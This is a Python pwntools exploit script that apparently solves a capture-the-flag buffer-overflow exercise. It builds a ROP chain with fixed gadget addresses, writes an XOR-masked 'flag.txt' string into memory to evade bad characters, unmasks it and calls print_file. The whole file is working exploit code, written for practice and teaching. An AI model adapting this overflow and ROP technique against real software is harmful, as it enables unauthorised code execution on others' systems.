import sys
from pwn import *


padding = b'a' * 40

pop_r12_r13_r14_r15 = 0x40069c
mov_r13_r12 = 0x400634

pop_r14_r15 = 0x4006a0
xor_r15_r14 = 0x400628

empty_data = 0x60103d
# changed the bad characters to something that can be modified with xor 0x01
flag = b'fl`f/tyt'

pop_rdi = 0x4006a3
print_file = 0x400510

modifier = 0x01

# padding to reach the ret address
payload = padding
# putting the destination adress and the text in the registers

payload += p64(pop_r12_r13_r14_r15)
payload += p64(u64(flag))
payload += p64(empty_data)
payload += p64(modifier)
payload += p64(empty_data + 2)
# moving the text into the destination address
payload += p64(mov_r13_r12)
# fixing the bad charaters with xor
# fixing a 
payload += p64(xor_r15_r14)
# fixing g 
payload += p64(pop_r14_r15)
payload += p64(modifier)
payload += p64(empty_data + 3)
payload += p64(xor_r15_r14)
# fixing .
payload += p64(pop_r14_r15)
payload += p64(modifier)
payload += p64(empty_data + 4)
payload += p64(xor_r15_r14)
# fixing x
payload += p64(pop_r14_r15)
payload += p64(modifier)
payload += p64(empty_data + 6)
payload += p64(xor_r15_r14)
#payload += p64()
payload += p64(pop_rdi)
payload += p64(empty_data)
payload += p64(print_file)

sys.stdout.buffer.write(payload)
